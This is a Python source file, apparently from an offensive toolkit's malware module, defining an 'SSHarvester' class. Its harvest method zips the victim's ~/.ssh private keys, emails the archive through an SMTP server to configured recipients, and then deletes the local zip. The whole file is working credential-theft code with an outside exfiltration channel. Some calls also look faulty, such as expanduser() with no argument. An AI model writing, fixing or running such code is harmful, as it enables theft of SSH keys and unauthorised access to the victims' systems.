from pyhtools.evil_files.malwares.utils import send_mail, create_zip
from tempfile import gettempdir
from os.path import join as path_join, expanduser, exists as is_exists
from os import chdir, getcwd, remove
from shutil import make_archive
from datetime import datetime


class SSHarvester:
    def __init__(self, sender_email: str, sender_passwd: str, server: str = "smtp.gmail.com", port: int = 587, receivers: list[str] = None) -> None:
        # email configurations
        self.sender_email = sender_email
        self.sender_passwd = sender_passwd
        self.server = server
        self.port = port
        self.receivers = receivers

    def harvest(self):
        cwd = getcwd()
        temp_path = gettempdir()

        ssh_path = path_join(expanduser(), '.ssh')
        chdir(ssh_path)

        if not is_exists(ssh_path):
            return False

        message = f'''
        -------------------------------
        PyHTools SSH Harvester
        -------------------------------
        SSH Directory Path: {ssh_path}

        PyHTools: https://github.com/dmdhrumilmistry/pyhtools
        '''

        # create zip file payload
        zip_name = f'ssh-keys-{datetime.now().strftime("%m-%d-%Y_%H-%M-%S")}.zip'
        make_archive(zip_name, 'zip', temp_path, ssh_path)
        zip_path = path_join(temp_path, zip_name)

        status = send_mail(email=self.sender_email, receiver_mails=self.receivers, password=self.sender_passwd,
                  smtp_server=self.server, smtp_port=self.port, zip_file_path=zip_path)

        chdir(temp_path)
        remove(zip_path)
        chdir(cwd)

        return status
